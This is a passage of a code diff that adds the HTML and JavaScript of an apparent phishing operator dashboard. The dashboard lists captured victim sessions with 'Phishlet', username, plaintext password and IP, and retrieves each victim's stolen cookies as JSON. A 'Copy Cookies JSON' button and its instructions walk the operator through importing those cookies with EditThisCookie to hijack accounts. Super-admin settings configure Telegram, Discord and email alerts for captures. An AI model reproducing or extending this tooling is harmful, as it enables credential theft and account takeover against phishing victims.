+                            <a id="editthiscookie-chrome-link" href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg" target="_blank" rel="noopener noreferrer" style="padding: 6px 12px !important; background: rgba(66, 133, 244, 0.3) !important; border: 1px solid rgba(66, 133, 244, 0.5) !important; border-radius: 8px !important; color: white !important; text-decoration: none !important; font-size: 12px !important; font-weight: 600 !important; transition: all 0.3s !important; display: inline-flex !important; align-items: center !important; gap: 5px !important; visibility: visible !important; opacity: 1 !important; pointer-events: auto !important; position: relative !important; z-index: 10 !important;" onmouseover="this.style.background='rgba(66, 133, 244, 0.5)'; this.style.borderColor='rgba(66, 133, 244, 0.7)'" onmouseout="this.style.background='rgba(66, 133, 244, 0.3)'; this.style.borderColor='rgba(66, 133, 244, 0.5)'">
+                                🌐 Chrome
+                            </a>
+                            <a id="editthiscookie-firefox-link" href="https://addons.mozilla.org/en-US/firefox/addon/edit-this-cookie/" target="_blank" rel="noopener noreferrer" style="padding: 6px 12px !important; background: rgba(255, 149, 0, 0.3) !important; border: 1px solid rgba(255, 149, 0, 0.5) !important; border-radius: 8px !important; color: white !important; text-decoration: none !important; font-size: 12px !important; font-weight: 600 !important; transition: all 0.3s !important; display: inline-flex !important; align-items: center !important; gap: 5px !important; visibility: visible !important; opacity: 1 !important; pointer-events: auto !important; position: relative !important; z-index: 10 !important;" onmouseover="this.style.background='rgba(255, 149, 0, 0.5)'; this.style.borderColor='rgba(255, 149, 0, 0.7)'" onmouseout="this.style.background='rgba(255, 149, 0, 0.3)'; this.style.borderColor='rgba(255, 149, 0, 0.5)'">
+                                🦊 Firefox
+                            </a>
+                        </div>
+                    </div>
+                    <ol style="color: rgba(255,255,255,0.8); line-height: 1.8; padding-left: 20px; margin: 0;">
+                        <li>Install <strong>EditThisCookie</strong> extension using the buttons above</li>
+                        <li>Click the extension icon</li>
+                        <li>Click <strong>"Import"</strong> tab</li>
+                        <li>Paste the copied JSON</li>
+                        <li>Click <strong>"Import"</strong></li>
+                    </ol>
+                </div>
+                
+                <div style="background: rgba(16, 185, 129, 0.2); padding: 15px; border-radius: 12px; border: 1px solid rgba(16, 185, 129, 0.4);">
+                    <p style="color: #d1fae5; margin: 0;"><strong>💡 Tip:</strong> Make sure you're on the correct domain before importing cookies!</p>
+                </div>
+                
+                <button onclick="closeCookieImportModal()" class="btn btn-primary" style="width: 100%; margin-top: 20px;">Got it!</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Load configuration on page load (only for super admin)
+        async function loadConfig() {
+            try {
+                const response = await fetch('/api/config');
+                if (response.status === 403) {
+                    // Normal admin - no access to config
+                    return;
+                }
+                if (!response.ok) {
+                    throw new Error('Failed to load configuration');
+                }
+                const config = await response.json();
+                
+                document.getElementById('db-path').value = config.dbfile_path || '';
+                document.getElementById('tele-token').value = config.telegram_token || '';
+                document.getElementById('tele-chatid').value = config.telegr_chatid || '';
+                document.getElementById('tele-enable').checked = config.telegram_enable || false;
+                document.getElementById('discord-token').value = config.discord_token || '';
+                document.getElementById('discord-chatid').value = config.discord_chat_id || '';
+                document.getElementById('discord-enable').checked = config.discord_enable || false;
+                document.getElementById('mail-host').value = config.mail_host || '';
+                document.getElementById('mail-port').value = config.mail_port || '';
+                document.getElementById('mail-user').value = config.mail_user || '';
+                document.getElementById('mail-password').value = config.mail_password || '';
+                document.getElementById('mail-to').value = config.to_mail || '';
+                document.getElementById('mail-enable').checked = config.mail_enable || false;
+            } catch (error) {
+                // Silently fail for normal admins
+                if (userRole === 'super_admin') {
+                    console.error('Error loading configuration:', error);
+                }
+            }
+        }
+
+        // Save configuration (only for super admin)
+        const configForm = document.getElementById('config-form');
+        if (configForm) {
+            configForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                
+                const config = {
+                    dbfile_path: document.getElementById('db-path').value,
+                    telegram_token: document.getElementById('tele-token').value,
+                    telegr_chatid: document.getElementById('tele-chatid').value,
+                    telegram_enable: document.getElementById('tele-enable').checked,
+                    discord_token: document.getElementById('discord-token').value,
+                    discord_chat_id: document.getElementById('discord-chatid').value,
+                    discord_enable: document.getElementById('discord-enable').checked,
+                    mail_host: document.getElementById('mail-host').value,
+                    mail_port: parseInt(document.getElementById('mail-port').value) || 0,
+                    mail_user: document.getElementById('mail-user').value,
+                    mail_password: document.getElementById('mail-password').value,
+                    to_mail: document.getElementById('mail-to').value,
+                    mail_enable: document.getElementById('mail-enable').checked
+                };
+
+                try {
+                    const response = await fetch('/api/config', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(config)
+                    });
+                    
+                    if (response.status === 403) {
+                        showAlert('Access denied: Super admin required', 'error');
+                        return;
+                    }
+                    
+                    const result = await response.json();
+                    if (response.ok) {
+                        showAlert('Configuration saved successfully!', 'success');
+                        updateStatus();
+                    } else {
+                        showAlert('Error saving configuration: ' + (result.message || 'Unknown error'), 'error');
+                    }
+                } catch (error) {
+                    showAlert('Error saving configuration: ' + error.message, 'error');
+                }
+            });
+        }
+
+        // Update status
+        async function updateStatus() {
+            try {
+                const response = await fetch('/api/status');
+                const status = await response.json();
+                
+                const monitoringIndicator = document.getElementById('monitoring-indicator');
+                const monitoringStatus = document.getElementById('monitoring-status');
+                if (status.monitoring) {
+                    monitoringIndicator.className = 'status-indicator active';
+                    monitoringStatus.textContent = 'Active';
+                } else {
+                    monitoringIndicator.className = 'status-indicator inactive';
+                    monitoringStatus.textContent = 'Inactive';
+                }
+
+                // Update notification status (only show if present in response)
+                const telegramIndicator = document.getElementById('telegram-indicator');
+                const telegramStatus = document.getElementById('telegram-status');
+                if (status.telegram) {
+                    if (status.telegram.enabled) {
+                        telegramIndicator.className = 'status-indicator active';
+                        telegramStatus.textContent = 'Enabled';
+                    } else {
+                        telegramIndicator.className = 'status-indicator inactive';
+                        telegramStatus.textContent = 'Disabled';
+                    }
+                } else {
+                    // Not shown for normal admin if disabled
+                    if (telegramIndicator && telegramIndicator.parentElement) {
+                        telegramIndicator.parentElement.style.display = 'none';
+                    }
+                }
+
+                const discordIndicator = document.getElementById('discord-indicator');
+                const discordStatus = document.getElementById('discord-status');
+                if (status.discord) {
+                    if (status.discord.enabled) {
+                        discordIndicator.className = 'status-indicator active';
+                        discordStatus.textContent = 'Enabled';
+                    } else {
+                        discordIndicator.className = 'status-indicator inactive';
+                        discordStatus.textContent = 'Disabled';
+                    }
+                } else {
+                    // Not shown for normal admin if disabled
+                    if (discordIndicator && discordIndicator.parentElement) {
+                        discordIndicator.parentElement.style.display = 'none';
+                    }
+                }
+
+                const emailIndicator = document.getElementById('email-indicator');
+                const emailStatus = document.getElementById('email-status');
+                if (status.email) {
+                    if (status.email.enabled) {
+                        emailIndicator.className = 'status-indicator active';
+                        emailStatus.textContent = 'Enabled';
+                    } else {
+                        emailIndicator.className = 'status-indicator inactive';
+                        emailStatus.textContent = 'Disabled';
+                    }
+                } else {
+                    // Not shown for normal admin if disabled
+                    if (emailIndicator && emailIndicator.parentElement) {
+                        emailIndicator.parentElement.style.display = 'none';
+                    }
+                }
+            } catch (error) {
+                console.error('Error updating status:', error);
+            }
+        }
+
+        // Load sessions
+        async function loadSessions() {
+            try {
+                const response = await fetch('/api/sessions');
+                const data = await response.json();
+                
+                const sessionsList = document.getElementById('sessions-list');
+                if (data.sessions && data.sessions.length > 0) {
+                    sessionsList.innerHTML = data.sessions.map(function(session, index) {
+                        const sessionId = session.id || 'N/A';
+                        const username = session.username || 'N/A';
+                        const landingUrl = session.landing_url || 'N/A';
+                        const createTime = session.create_time ? new Date(session.create_time * 1000).toLocaleString() : 'N/A';
+                        const sessionData = encodeURIComponent(JSON.stringify(session));
+                        
+                        return '<div class="session-item" onclick="showSessionDetailsFromData(\'' + sessionData + '\')">' +
+                            '<div class="session-info">' +
+                            '<strong>Session #' + sessionId + '</strong>' +
+                            '<small>User: ' + username + ' | URL: ' + landingUrl + '<br>Time: ' + createTime + '</small>' +
+                            '</div>' +
+                            '<span class="session-badge">✓ Processed</span>' +
+                            '</div>';
+                    }).join('');
+                } else {
+                    sessionsList.innerHTML = '<p style="color: rgba(255,255,255,0.7); text-align: center; padding: 20px;">No sessions found in database</p>';
+                }
+            } catch (error) {
+                console.error('Error loading sessions:', error);
+                document.getElementById('sessions-list').innerHTML = '<p style="color: rgba(255,255,255,0.7); text-align: center; padding: 20px;">Error loading sessions: ' + error.message + '</p>';
+            }
+        }
+
+        // Refresh sessions manually
+        async function refreshSessions() {
+            const sessionsList = document.getElementById('sessions-list');
+            sessionsList.innerHTML = '<p style="color: rgba(255,255,255,0.7); text-align: center; padding: 20px;">Refreshing sessions...</p>';
+            
+            try {
+                const response = await fetch('/api/sessions?refresh=true');
+                const data = await response.json();
+                
+                if (data.sessions && data.sessions.length > 0) {
+                    sessionsList.innerHTML = '<p style="color: rgba(255,255,255,0.9); text-align: center; padding: 10px; margin-bottom: 10px; background: rgba(16, 185, 129, 0.2); border-radius: 8px;">Found ' + data.count + ' sessions</p>' +
+                        data.sessions.map(function(session) {
+                            const sessionId = session.id || 'N/A';
+                            const username = session.username || 'N/A';
+                            const landingUrl = session.landing_url || 'N/A';
+                            const createTime = session.create_time ? new Date(session.create_time * 1000).toLocaleString() : 'N/A';
+                            
+                            const sessionData = encodeURIComponent(JSON.stringify(session));
+                            return '<div class="session-item" onclick="showSessionDetailsFromData(\'' + sessionData + '\')">' +
+                                '<div class="session-info">' +
+                                '<strong>Session #' + sessionId + '</strong>' +
+                                '<small>User: ' + username + ' | URL: ' + landingUrl + '<br>Time: ' + createTime + '</small>' +
+                                '</div>' +
+                                '<span class="session-badge">✓ Processed</span>' +
+                                '</div>';
+                        }).join('');
+                    showAlert('Loaded ' + data.count + ' sessions from database', 'success');
+                } else {
+                    sessionsList.innerHTML = '<p style="color: rgba(255,255,255,0.7); text-align: center; padding: 20px;">No sessions found in database</p>';
+                    showAlert('No sessions found in database', 'error');
+                }
+            } catch (error) {
+                console.error('Error refreshing sessions:', error);
+                sessionsList.innerHTML = '<p style="color: rgba(255,255,255,0.7); text-align: center; padding: 20px;">Error loading sessions: ' + error.message + '</p>';
+                showAlert('Error refreshing sessions: ' + error.message, 'error');
+            }
+        }
+
+        // Start monitoring
+        async function startMonitoring() {
+            try {
+                const response = await fetch('/api/monitoring/start', { method: 'POST' });
+                const result = await response.json();
+                if (response.ok) {
+                    showAlert('Monitoring started successfully!', 'success');
+                    updateStatus();
+                } else {
+                    showAlert('Error starting monitoring: ' + (result.message || 'Unknown error'), 'error');
+                }
+            } catch (error) {
+                showAlert('Error starting monitoring: ' + error.message, 'error');
+            }
+        }
+
+        // Stop monitoring
+        async function stopMonitoring() {
+            try {
+                const response = await fetch('/api/monitoring/stop', { method: 'POST' });
+                const result = await response.json();
+                if (response.ok) {
+                    showAlert('Monitoring stopped successfully!', 'success');
+                    updateStatus();
+                } else {
+                    showAlert('Error stopping monitoring: ' + (result.message || 'Unknown error'), 'error');
+                }
+            } catch (error) {
+                showAlert('Error stopping monitoring: ' + error.message, 'error');
+            }
+        }
+
+        // Show alert
+        function showAlert(message, type) {
+            const alert = document.getElementById('alert');
+            alert.textContent = message;
+            alert.className = 'alert ' + type;
+            alert.style.display = 'block';
+            setTimeout(() => {
+                alert.style.display = 'none';
+            }, 5000);
+        }
+
+        // Show session details modal from encoded data
+        function showSessionDetailsFromData(encodedData) {
+            try {
+                const session = JSON.parse(decodeURIComponent(encodedData));
+                showSessionDetails(session);
+            } catch (e) {
+                console.error('Error parsing session data:', e);
+                showAlert('Error loading session details', 'error');
+            }
+        }
+        
+        // Show session details modal
+        function showSessionDetails(session) {
+            const modal = document.getElementById('sessionModal');
+            const modalBody = document.getElementById('modalBody');
+            
+            // Show loading state
+            modalBody.innerHTML = '<div style="text-align: center; padding: 20px;">Loading cookies...</div>';
+            modal.style.display = 'block';
+            
+            // Fetch cookies from backend (uses exact same logic as Go monitor)
+            fetch(`/api/sessions/${session.id}/cookies`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.error) {
+                        console.error('[Cookies] Error:', data.error);
+                        modalBody.innerHTML = `<div style="color: red;">Error: ${data.error}</div>`;
+                        return;
+                    }
+                    
+                    const cookiesArray = data.cookies || [];
+                    console.log(`[Cookies] Fetched ${cookiesArray.length} cookies from backend`);
+                    
+                    // Format cookies as JSON array (like cokie.json format)
+                    // Cookies are already in correct format from backend (matches Go monitor logic)
+                    const cookiesText = cookiesArray.length > 0 ? JSON.stringify(cookiesArray) : '[]';
+                    
+                    // Format dates
+                    const createTime = session.create_time ? new Date(session.create_time * 1000).toLocaleString() : 'N/A';
+                    const updateTime = session.update_time ? new Date(session.update_time * 1000).toLocaleString() : 'N/A';
+                    
+                    // Build modal content
+                    modalBody.innerHTML = 
+                        '<div class="detail-row">' +
+                            '<div class="detail-label">Session ID</div>' +
+                            '<div class="detail-value">' + (session.id || 'N/A') + '</div>' +
+                        '</div>' +
+                        '<div class="detail-row">' +
+                            '<div class="detail-label">Phishlet</div>' +
+                            '<div class="detail-value">' + (session.phishlet || 'N/A') + '</div>' +
+                        '</div>' +
+                        '<div class="detail-row">' +
+                            '<div class="detail-label">Username</div>' +
+                            '<div class="detail-value">' + (session.username || 'N/A') + '</div>' +
+                        '</div>' +
+                        '<div class="detail-row">' +
+                            '<div class="detail-label">Password</div>' +
+                            '<div class="detail-value">' + (session.password || 'N/A') + '</div>' +
+                        '</div>' +
+                        '<div class="detail-row">' +
+                            '<div class="detail-label">Landing URL</div>' +
+                            '<div class="detail-value">' + (session.landing_url || 'N/A') + '</div>' +
+                        '</div>' +
+                        '<div class="detail-row">' +
+                            '<div class="detail-label">User Agent</div>' +
+                            '<div class="detail-value">' + (session.useragent || 'N/A') + '</div>' +
+                        '</div>' +
+                        '<div class="detail-row">' +
+                            '<div class="detail-label">Remote Address</div>' +
+                            '<div class="detail-value">' + (session.remote_addr || 'N/A') + '</div>' +
+                        '</div>' +
+                        '<div class="detail-row">' +
+                            '<div class="detail-label">Session ID</div>' +
+                            '<div class="detail-value">' + (session.session_id || 'N/A') + '</div>' +
+                        '</div>' +
+                        '<div class="detail-row">' +
+                            '<div class="detail-label">Create Time</div>' +
+                            '<div class="detail-value">' + createTime + '</div>' +
+                        '</div>' +
+                        '<div class="detail-row">' +
+                            '<div class="detail-label">Update Time</div>' +
+                            '<div class="detail-value">' + updateTime + '</div>' +
+                        '</div>' +
+                        '<div class="cookies-section">' +
+                            '<div class="detail-label" style="margin-bottom: 10px;">Cookies (JSON Format) - ' + cookiesArray.length + ' cookies</div>' +
+                            '<textarea class="cookies-textarea" id="cookiesText" readonly>' + cookiesText + '</textarea>' +
+                            '<button class="copy-btn" id="copyCookiesBtn" type="button" onclick="window.copyCookies(event); return false;">📋 Copy Cookies JSON</button>' +
+                        '</div>';
+                    
+                    modal.style.display = 'block';
+                    
+                    // Attach event handler to copy button
+                    // Use setTimeout to ensure DOM is ready
+                    setTimeout(() => {
+                        const copyBtn = document.getElementById('copyCookiesBtn');
+                        if (copyBtn) {
+                            console.log('✅ Copy button found, attaching event handler');
+                            // Remove any existing event listeners by cloning
+                            const newCopyBtn = copyBtn.cloneNode(true);
+                            copyBtn.parentNode.replaceChild(newCopyBtn, copyBtn);
+                            
+                            // Add click event listener
+                            newCopyBtn.addEventListener('click', function(e) {
+                                console.log('🔵 Copy button clicked!');
+                                e.preventDefault();
+                                e.stopPropagation();
+                                copyCookies(e);
+                                return false;
+                            }, true); // Use capture phase
+                            
+                            // Also add as onclick for compatibility
+                            newCopyBtn.onclick = function(e) {
+                                console.log('🔵 Copy button onclick triggered!');
+                                e.preventDefault();
+                                e.stopPropagation();
+                                copyCookies(e);
+                                return false;
+                            };
+                            
+                            console.log('✅ Copy button event handlers attached');
+                            console.log('Button element:', newCopyBtn);
+                            console.log('Button onclick:', newCopyBtn.onclick);
+                        } else {
+                            console.error('❌ Copy button not found after modal display');
+                        }
+                    }, 200);
+                })
+                .catch(error => {
+                    console.error('[Cookies] Fetch error:', error);
+                    modalBody.innerHTML = `<div style="color: red;">Error fetching cookies: ${error.message}</div>`;
+                });
+        }
+        
+        // Close modal
+        function closeModal() {
+            document.getElementById('sessionModal').style.display = 'none';
+        }
+        
+        // Copy cookies to clipboard and show import modal
+        // Make it globally accessible
+        window.copyCookies = function copyCookies(evt) {
+            console.log('=== COPY COOKIES FUNCTION CALLED ===');
+            console.log('Event:', evt);
+            
+            // Prevent event bubbling
+            if (evt) {
+                evt.preventDefault();
+                evt.stopPropagation();
+            }
+            
+            const cookiesText = document.getElementById('cookiesText');
+            console.log('Cookies textarea element:', cookiesText);
+            
+            if (!cookiesText) {
+                console.error('❌ Cookies textarea not found');
+                alert('Cookies textarea not found');
+                return;
+            }
+            
+            const copyBtn = evt ? (evt.target || evt.currentTarget) : document.getElementById('copyCookiesBtn');
+            console.log('Copy button element:', copyBtn);
+            console.log('Cookies text value length:', cookiesText.value.length);
+            
+            cookiesText.select();
+            cookiesText.setSelectionRange(0, 99999); // For mobile devices
+            console.log('✅ Text selected for copying');
+            
+            const showImportModal = () => {
+                console.log('=== SHOW IMPORT MODAL FUNCTION CALLED ===');
+                const modal = document.getElementById('cookieImportModal');
+                console.log('Modal element found:', !!modal);
+                console.log('Modal element:', modal);
+                
+                if (!modal) {
+                    console.error('❌ Cookie import modal element not found!');
+                    console.error('Available modals:', {
+                        sessionModal: document.getElementById('sessionModal'),
+                        cookieImportModal: document.getElementById('cookieImportModal')
+                    });
+                    alert('Import modal not found. Please refresh the page.');
+                    return;
+                }
+                
+                console.log('Modal initial state:', {
+                    display: modal.style.display,
+                    visibility: modal.style.visibility,
+                    zIndex: modal.style.zIndex,
+                    offsetHeight: modal.offsetHeight,
+                    computedDisplay: window.getComputedStyle(modal).display,
+                    computedZIndex: window.getComputedStyle(modal).zIndex,
+                    computedVisibility: window.getComputedStyle(modal).visibility,
+                    computedOpacity: window.getComputedStyle(modal).opacity
+                });
+                
+                // Force show the modal - use setProperty to override any CSS
+                console.log('Setting modal styles...');
+                
+                // Remove any attributes that might hide it
+                modal.removeAttribute('hidden');
+                modal.removeAttribute('aria-hidden');
+                
+                // Set all styles with !important via setProperty
+                modal.style.setProperty('display', 'block', 'important');
+                modal.style.setProperty('visibility', 'visible', 'important');
+                modal.style.setProperty('opacity', '1', 'important');
+                modal.style.setProperty('z-index', '5000', 'important');
+                modal.style.setProperty('position', 'fixed', 'important');
+                modal.style.setProperty('left', '0', 'important');
+                modal.style.setProperty('top', '0', 'important');
+                modal.style.setProperty('width', '100%', 'important');
+                modal.style.setProperty('height', '100%', 'important');
+                modal.style.setProperty('background', 'rgba(0, 0, 0, 0.85)', 'important');
+                modal.style.setProperty('pointer-events', 'auto', 'important');
+                modal.classList.add('show');
+                
+                // Also set on the modal content
+                const modalContent = modal.querySelector('.modal-content');
+                if (modalContent) {
+                    modalContent.style.setProperty('display', 'block', 'important');
+                    modalContent.style.setProperty('z-index', '5001', 'important');
+                    modalContent.style.setProperty('position', 'relative', 'important');
+                    modalContent.style.setProperty('visibility', 'visible', 'important');
+                    modalContent.style.setProperty('opacity', '1', 'important');
+                }
+                
+                // Ensure session modal is below (lower z-index)
+                const sessionModal = document.getElementById('sessionModal');
+                if (sessionModal) {
+                    sessionModal.style.setProperty('z-index', '2000', 'important');
+                }
+                
+                // Scroll to top
+                modal.scrollTop = 0;
+                
+                // Force a reflow to ensure styles are applied
+                void modal.offsetHeight;
+                
+                // Double-check visibility after reflow
+                setTimeout(() => {
+                    const computedStyle = window.getComputedStyle(modal);
+                    console.log('Modal final computed styles:', {
+                        display: computedStyle.display,
+                        visibility: computedStyle.visibility,
+                        opacity: computedStyle.opacity,
+                        zIndex: computedStyle.zIndex,
+                        position: computedStyle.position
+                    });
+                    
+                    if (computedStyle.display === 'none' || computedStyle.visibility === 'hidden') {
+                        console.error('❌ Modal still hidden after all attempts!');
+                        // Last resort: append to body
+                        if (modal.parentElement !== document.body) {
+                            document.body.appendChild(modal);
+                            modal.style.setProperty('display', 'block', 'important');
+                            modal.style.setProperty('z-index', '9999', 'important');
+                        }
+                    }
+                }, 50);
+                
+                console.log('Modal after setting styles:', {
+                    display: modal.style.display,
+                    visibility: modal.style.visibility,
+                    zIndex: modal.style.zIndex,
+                    offsetHeight: modal.offsetHeight,
+                    offsetWidth: modal.offsetWidth,
+                    computedDisplay: window.getComputedStyle(modal).display,
+                    computedZIndex: window.getComputedStyle(modal).zIndex,
+                    computedVisibility: window.getComputedStyle(modal).visibility,
+                    computedOpacity: window.getComputedStyle(modal).opacity,
+                    computedPosition: window.getComputedStyle(modal).position,
+                    hasShowClass: modal.classList.contains('show')
+                });
+                
+                // Check if modal content is visible (reuse modalContent from above)
+                console.log('Modal content element:', modalContent);
+                if (modalContent) {
+                    console.log('Modal content styles:', {
+                        display: window.getComputedStyle(modalContent).display,
+                        zIndex: window.getComputedStyle(modalContent).zIndex,
+                        offsetHeight: modalContent.offsetHeight,
+                        offsetWidth: modalContent.offsetWidth
+                    });
+                }
+                
+                // Check for any parent elements that might be hiding it
+                let parent = modal.parentElement;
+                let depth = 0;
+                while (parent && depth < 5) {
+                    console.log(`Parent ${depth} (${parent.tagName}):`, {
+                        display: window.getComputedStyle(parent).display,
+                        visibility: window.getComputedStyle(parent).visibility,
+                        zIndex: window.getComputedStyle(parent).zIndex,
+                        overflow: window.getComputedStyle(parent).overflow
+                    });
+                    parent = parent.parentElement;
+                    depth++;
+                }
+                
+                console.log('✅ Modal display attempt complete');
+            };
+            
+            const copyText = cookiesText.value;
+            console.log('Starting copy process...');
+            
+            // Try modern clipboard API first
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                console.log('Using Clipboard API...');
+                navigator.clipboard.writeText(copyText).then(function() {
+                    console.log('✅ Clipboard API: Copy successful');
+                    const originalText = copyBtn.textContent;
+                    copyBtn.textContent = '✓ Copied!';
+                    copyBtn.classList.add('copy-success');
+                    
+                    // Show import instructions modal after a brief delay to ensure copy completes
+                    console.log('Calling showImportModal()...');
+                    setTimeout(() => {
+                        showImportModal();
+                    }, 100);
+                    
+                    setTimeout(function() {
+                        copyBtn.textContent = originalText;
+                        copyBtn.classList.remove('copy-success');
+                    }, 2000);
+                }).catch(function(err) {
+                    console.error('❌ Clipboard API failed:', err);
+                    // Fallback to execCommand
+                    console.log('Falling back to execCommand...');
+                    try {
+                        const success = document.execCommand('copy');
+                        if (success) {
+                            console.log('✅ execCommand: Copy successful');
+                            const originalText = copyBtn.textContent;
+                            copyBtn.textContent = '✓ Copied!';
+                            copyBtn.classList.add('copy-success');
+                            console.log('Calling showImportModal()...');
+                            setTimeout(() => {
+                                showImportModal();
+                            }, 100);
+                            setTimeout(function() {
+                                copyBtn.textContent = originalText;
+                                copyBtn.classList.remove('copy-success');
+                            }, 2000);
+                        } else {
+                            throw new Error('execCommand failed');
+                        }
+                    } catch (e) {
+                        console.error('❌ All copy methods failed:', e);
+                        alert('Failed to copy. Please select and copy manually.');
+                    }
+                });
+            } else {
+                // Fallback to execCommand
+                console.log('Clipboard API not available, using execCommand...');
+                try {
+                    const success = document.execCommand('copy');
+                    if (success) {
+                        console.log('✅ execCommand: Copy successful');
+                        const originalText = copyBtn.textContent;
+                        copyBtn.textContent = '✓ Copied!';
+                        copyBtn.classList.add('copy-success');
+                        console.log('Calling showImportModal()...');
+                        setTimeout(() => {
+                            showImportModal();
+                        }, 100);
+                        setTimeout(function() {
+                            copyBtn.textContent = originalText;
+                            copyBtn.classList.remove('copy-success');
+                        }, 2000);
+                    } else {
+                        throw new Error('execCommand failed');
+                    }
+                } catch (err) {
+                    console.error('❌ Copy failed:', err);
+                    alert('Failed to copy. Please select and copy manually.');
+                }
+            }
+            
+            console.log('=== COPY COOKIES FUNCTION COMPLETE ===');
+        };
+        
+        function closeCookieImportModal() {
+            console.log('=== CLOSE IMPORT MODAL FUNCTION CALLED ===');
+            const modal = document.getElementById('cookieImportModal');
+            console.log('Modal element:', modal);
+            if (modal) {
+                console.log('Closing modal...');
+                modal.style.display = 'none';
+                modal.style.visibility = 'hidden';
+                modal.classList.remove('show');
+                console.log('Modal closed. Display:', modal.style.display);
+            } else {
+                console.error('❌ Modal not found for closing');
+            }
+        }
+        
+        // Test function to show modal (for debugging) - call this from console: testShowImportModal()
+        function testShowImportModal() {
+            console.log('=== TEST SHOW IMPORT MODAL ===');
+            const modal = document.getElementById('cookieImportModal');
+            console.log('Modal element:', modal);
+            if (modal) {
+                console.log('Modal initial state:', {
+                    display: modal.style.display,
+                    computedDisplay: window.getComputedStyle(modal).display,
+                    zIndex: window.getComputedStyle(modal).zIndex
+                });
+                
+                modal.removeAttribute('hidden');
+                modal.style.setProperty('display', 'block', 'important');
+                modal.style.setProperty('visibility', 'visible', 'important');
+                modal.style.setProperty('opacity', '1', 'important');
+                modal.style.setProperty('z-index', '5000', 'important');
+                modal.style.setProperty('position', 'fixed', 'important');
+                modal.style.setProperty('left', '0', 'important');
+                modal.style.setProperty('top', '0', 'important');
+                modal.style.setProperty('width', '100%', 'important');
+                modal.style.setProperty('height', '100%', 'important');
+                modal.style.setProperty('background', 'rgba(0, 0, 0, 0.85)', 'important');
+                modal.classList.add('show');
+                
+                void modal.offsetHeight; // Force reflow
+                
+                console.log('✅ Test: Modal styles set. Display:', modal.style.display);
+                console.log('Modal computed display:', window.getComputedStyle(modal).display);
+                console.log('Modal computed z-index:', window.getComputedStyle(modal).zIndex);
+                console.log('Modal offsetHeight:', modal.offsetHeight);
+                console.log('Modal offsetWidth:', modal.offsetWidth);
+                
+                if (modal.offsetHeight === 0) {
+                    console.error('❌ Modal has 0 height - something is hiding it!');
+                } else {
+                    console.log('✅ Modal should be visible now!');
+                }
+            } else {
+                console.error('❌ Test: Modal not found!');
+            }
+        }
+        
+        // Make function globally available
+        window.testShowImportModal = testShowImportModal;
+        
+        // Log when page loads
+        window.addEventListener('DOMContentLoaded', function() {
+            console.log('=== PAGE LOADED ===');
+            console.log('Cookie import modal element exists:', !!document.getElementById('cookieImportModal'));
+            console.log('Session modal element exists:', !!document.getElementById('sessionModal'));
+            const importModal = document.getElementById('cookieImportModal');
+            const sessionModal = document.getElementById('sessionModal');
+            if (importModal) {
+                console.log('Import modal initial state:', {
+                    display: window.getComputedStyle(importModal).display,
+                    zIndex: window.getComputedStyle(importModal).zIndex,
+                    visibility: window.getComputedStyle(importModal).visibility
+                });
+            }
+            if (sessionModal) {
+                console.log('Session modal initial state:', {
+                    display: window.getComputedStyle(sessionModal).display,
+                    zIndex: window.getComputedStyle(sessionModal).zIndex
+                });
+            }
+        });
+        
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const sessionModal = document.getElementById('sessionModal');
+            const cookieImportModal = document.getElementById('cookieImportModal');
+            
+            // Only close session modal if cookie import modal is not open
+            if (event.target == sessionModal && cookieImportModal.style.display !== 'block') {
+                closeModal();
+            }
+            // Close cookie import modal when clicking its background
+            if (event.target == cookieImportModal) {
+                closeCookieImportModal();
+            }
+        }
+        
+        // Mobile menu toggle
+        function toggleMobileMenu() {
+            const hamburger = document.getElementById('hamburger');
+            const mobileMenu = document.getElementById('mobile-menu');
+            if (hamburger && mobileMenu) {
+                hamburger.classList.toggle('active');
+                mobileMenu.classList.toggle('active');
+            }
+        }
+        
+        // Close mobile menu when clicking outside
+        document.addEventListener('click', function(event) {
+            const hamburger = document.getElementById('hamburger');
+            const mobileMenu = document.getElementById('mobile-menu');
+            if (hamburger && mobileMenu && mobileMenu.classList.contains('active')) {
+                if (!hamburger.contains(event.target) && !mobileMenu.contains(event.target)) {
+                    hamburger.classList.remove('active');
+                    mobileMenu.classList.remove('active');
+                }
+            }
+        });
+        
+        // Load extension URLs from config
+        async function loadExtensionUrls() {
+            try {
+                const response = await fetch('/api/extension-urls');
+                if (response.ok) {
+                    const urls = await response.json();
+                    // Update Cookie-Editor links
+                    const cookieEditorChrome = document.getElementById('cookie-editor-chrome-link');
+                    const cookieEditorFirefox = document.getElementById('cookie-editor-firefox-link');
+                    if (cookieEditorChrome && urls.cookie_editor_chrome_url) {
+                        cookieEditorChrome.href = urls.cookie_editor_chrome_url;
+                    }
+                    if (cookieEditorFirefox && urls.cookie_editor_firefox_url) {
+                        cookieEditorFirefox.href = urls.cookie_editor_firefox_url;
+                    }
+                    // Update EditThisCookie links
+                    const editThisCookieChrome = document.getElementById('editthiscookie-chrome-link');
+                    const editThisCookieFirefox = document.getElementById('editthiscookie-firefox-link');
+                    if (editThisCookieChrome && urls.editthiscookie_chrome_url) {
+                        editThisCookieChrome.href = urls.editthiscookie_chrome_url;
+                    }
+                    if (editThisCookieFirefox && urls.editthiscookie_firefox_url) {
+                        editThisCookieFirefox.href = urls.editthiscookie_firefox_url;
+                    }
+                }
+            } catch (error) {
+                // Silently fail - use default URLs
+                console.log('Using default extension URLs');
+            }
+        }
+        
+        // Get user role and set up role-based UI
+        let userRole = 'admin';
+        async function loadUserRole() {
+            try {
+                const response = await fetch('/api/user/role');
+                const data = await response.json();
+                userRole = data.role || 'admin';
+                
+                // Update role badge (desktop and mobile)
+                const roleBadge = document.getElementById('user-role-badge');
+                if (roleBadge) {
+                    roleBadge.textContent = userRole === 'super_admin' ? '🔑 Super Admin' : '👤 Admin';
+                }
+                const roleBadgeMobile = document.getElementById('user-role-badge-mobile');
+                if (roleBadgeMobile) {
+                    roleBadgeMobile.textContent = userRole === 'super_admin' ? '🔑 Super Admin' : '👤 Admin';
+                }
+                
+                // Show/hide elements based on role (desktop and mobile)
+                if (userRole === 'super_admin') {
+                    // Show config section, database viewer, manage admins, and notifications for super admin
+                    const configSection = document.getElementById('config-section');
+                    if (configSection) configSection.style.display = 'block';
